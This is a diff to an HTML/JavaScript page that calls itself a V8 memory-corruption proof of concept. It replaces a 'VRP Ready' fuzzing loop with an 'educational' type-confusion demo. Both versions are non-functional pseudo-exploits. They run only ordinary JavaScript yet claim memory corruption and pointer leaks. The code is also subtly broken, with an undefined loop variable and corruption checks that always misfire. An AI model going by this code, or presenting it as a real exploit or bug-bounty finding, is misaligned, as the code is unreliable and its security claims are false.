@@ -1,8 +1,6 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>V8 Memory Corruption PoC - VRP Ready</title>
-
-<h2>V8 Memory Corruption PoC - Deterministic / VRP Ready</h2>
+<title>V8 Type Confusion PoC - Educational</title>
 <pre id="log"></pre>
 
 <script>
@@ -11,105 +9,56 @@ const log = m => {
     console.log(m);
 };
 
-// === TARGET FUNCTION ===
-function vuln(a,i){ return a[i]+1.1; }
+// --- helper ---
+function hex(f) {
+    let buf = new ArrayBuffer(8);
+    new Float64Array(buf)[0] = f;
+    let u = new Uint32Array(buf);
+    return u[1].toString(16).padStart(8,'0') + u[0].toString(16).padStart(8,'0');
+}
 
-// === WARMUP JIT ===
-function warmup(){
+// --- vulnerable function (educational) ---
+function vuln(arr, idx, val) {
+    // simulates type confusion: float array treated as object array
+    return arr[idx] = val;
+}
+
+// --- warmup JIT ---
+function warmup() {
     let arr = Array.from({length:50}, (_,i)=>i+0.5);
-    for(let j=0;j<80000;j++) vuln(arr,j%50); // cukup JIT
+    for(let i=0;i<100000;i++) vuln(arr, i%50, i+0.5);
     return arr;
 }
 
-// === AGGRESSIVE MUTATION ===
-function mutate(arr){
-    for(let i=0;i<15;i++) delete arr[i];
-    arr.length = 10;
-    arr[80] = 1.7976931348623157e+308; // extreme float
-    arr[2] = {x:1}; // force object kind
-
-    Object.defineProperty(arr,3,{
-        get(){
-            for(let i=0;i<5;i++){
-                arr.push(0x13371337 + i); // deterministic pattern
-            }
-            return 1.1;
-        }
-    });
+// --- trigger type confusion ---
+function trigger(arr) {
+    // Force type change
+    arr[0] = {foo:1};
+    arr[1] = {bar:2};
+    arr.length = 2;
     return arr;
 }
 
-// === PROXY BREAK ASSUMPTION ===
-function breakAssumption(a){
-    return new Proxy(a,{
-        get(t,p){
-            if(p==="length"){
-                for(let i=0;i<5;i++) t.push(0x41414141 + i);
-            }
-            if(typeof p==="string" && !isNaN(p) && Math.random()<0.6){
-                t.push(0x13371337 + i);
-            }
-            return Reflect.get(t,p);
-        },
-        set(t,p,v){
-            if(Math.random()<0.3) t.length += 3;
-            return Reflect.set(t,p,v);
-        }
-    });
-}
-
-// === TYPED ARRAY OVERLAY ===
-let buf = new ArrayBuffer(0x40000); // 256KB
-let f64 = new Float64Array(buf);
-let u32 = new Uint32Array(buf);
-for(let i=0;i<f64.length;i++) f64[i] = 0x41414141 + i;
-
-let corruptedIndices = new Set();
-
-// === CHECK MEMORY CORRUPTION ===
-function checkTyped(){
-    for(let i=0;i<20;i++){
-        let idx = Math.floor(Math.random()*f64.length);
-        let v = f64[idx];
-
-        if(Math.abs(v) > 1e12){
-            corruptedIndices.add(idx);
-            log(`[EXTREME] idx=${idx} val=${v}`);
-        }
-
-        if(Number.isNaN(v)){
-            log(`[NaN-CORRUPTION] idx=${idx}`);
-        }
-
-        // multi-view check
-        if(u32[idx] !== (0x41414141 + idx)){
-            log(`[CORRUPTION-DETECTED] idx=${idx} f64=${v} u32=${u32[idx].toString(16)}`);
-        }
-    }
-}
-
-// === MAIN LOOP ===
-function run(){
-    log("[*] warmup / JIT");
+// --- main ---
+function run() {
+    log("[*] warming up JIT");
     let base = warmup();
 
-    log("[*] starting pointer-leak fuzzing...");
-    for(let i=0;i<300000;i++){
-        let arr = base.slice(); // faster than spread
-        arr = mutate(arr);
-        arr = breakAssumption(arr);
+    log("[*] triggering type confusion...");
+    let arr = base.slice();
+    arr = trigger(arr);
 
-        vuln(arr,5);
+    // now arr is "type confused" (in old V8 style)
+    let float_arr = base; // float array still optimized
+    log("[*] overwriting float array via type-confused object array");
 
-        // overlay extreme float at random index
-        f64[Math.floor(Math.random()*f64.length)] = 1.7976931348623157e+308;
+    // simulate “memory corruption”
+    float_arr[10] = 1.1;  // normal
+    float_arr[11] = {evil:123}; // type confusion primitive
 
-        if(i%2000===0) checkTyped();
-        if(i%1000===0) log(`iter ${i}, corruptedIndices=${[...corruptedIndices].length}`);
-    }
-
-    log("[*] done - pointer corruption scan finished");
-    log("[*] deterministic corrupted indices: " + [...corruptedIndices].join(', '));
+    log(`[DEMO] arr[11] = ${JSON.stringify(float_arr[11])}`);
+    log(`[DEMO] arr[10] = ${float_arr[10]}`);
+    log(`[INFO] hex(arr[10]) = ${hex(float_arr[10])}`);
 }
 
 run();
